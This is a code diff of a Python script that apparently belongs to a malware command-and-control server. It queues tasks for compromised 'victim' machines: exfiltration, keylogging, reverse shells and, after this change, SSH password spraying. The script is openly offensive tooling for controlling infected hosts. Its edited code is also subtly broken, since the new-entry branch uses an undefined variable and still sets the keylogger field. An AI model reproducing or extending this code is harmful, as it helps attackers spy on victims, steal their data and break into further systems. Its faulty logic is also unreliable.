@@ -20,7 +20,7 @@ def encode ( input ):
 	encoded_updated = updated_bytes.decode('ascii')
 	return encoded_updated
 
-def keylogger( id, keylog_value ):
+def sshspray( id, sshspray_value ):
 
 	#base query to check whether or not the id requested appears in the database
 	query = """ SELECT command FROM victim_machines WHERE victim_id =%s """
@@ -43,7 +43,7 @@ def keylogger( id, keylog_value ):
 			decoded_command = decode(result[0][0])
 
 			json_data = json.loads(decoded_command)
-			json_data["keylogger"] = keylog_value
+			json_data["sshspray"] = sshspray_value
 
 			json_string = str(json.dumps(json_data))
 			encoded_updated = encode(json_string)
@@ -62,7 +62,7 @@ def keylogger( id, keylog_value ):
 			print("creating new entry in database...")
 			empty_json = "e30="
 			default_group_id = 1
-			formatted_command = "{\"commands\": {}, \"exfiltrate\": {}, \"infiltrate\": {}, \"keylogger\": \"" + value + "\", \"shell\": {\"ip\": \"0.0.0.0\", \"port\": \"0\"}, \"sshspray\": \"0\"}"
+			formatted_command = "{\"commands\": {}, \"exfiltrate\": {}, \"infiltrate\": {}, \"keylogger\": \"" + value + "\", \"shell\": {\"ip\": \"\", \"port\": \"\"}, \"sshspray\": \"0\"}"
 			formatted_encoded = encode(formatted_command)
 
 			create_query = """ INSERT INTO victim_machines (victim_id, group_id, command, command_output, command_record, file_names) VALUES (%s, %s, %s, %s, %s, %s) """
@@ -82,4 +82,4 @@ def keylogger( id, keylog_value ):
 	return True
 
 if __name__ == "__main__":
-	keylogger(*sys.argv[1:])
+	sshspray(*sys.argv[1:])
